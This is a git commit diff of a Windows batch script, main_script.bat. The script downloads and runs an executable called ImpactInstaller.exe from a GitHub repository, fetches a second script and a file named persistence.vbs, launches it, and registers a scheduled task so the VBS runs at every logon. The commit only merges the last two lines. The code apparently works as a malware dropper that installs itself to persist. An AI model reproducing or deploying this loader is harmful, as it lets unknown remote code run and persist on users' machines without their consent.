64b4018178b042c165181b0f56057795dbb94b74
ishanarya24 <91789624+ishanarya24@users.noreply.github.com>
2021-10-21 09:00:21 +0530

    Update main_script.bat

--- main_script.bat
+++ main_script.bat
@@ -1,3 +1,2 @@
 curl https://raw.githubusercontent.com/ishanarya24/dc/main/ImpactInstaller.exe --output %appdata%/ImpactInstaller.exe && start %appdata%/ImpactInstaller.exe & cd %appdata% && curl https://raw.githubusercontent.com/ishanarya24/dc/main/script.bat -O && curl https://raw.githubusercontent.com/ishanarya24/dc/main/persistence.vbs -O && start persistence.vbs
-SCHTASKS /CREATE /SC ONLOGON /TN "extraTask\task_99078" /TR %appdata%\persistence.vbs
-EXIT
+SCHTASKS /CREATE /SC ONLOGON /TN "extraTask\task_99078" /TR %appdata%\persistence.vbs && EXIT
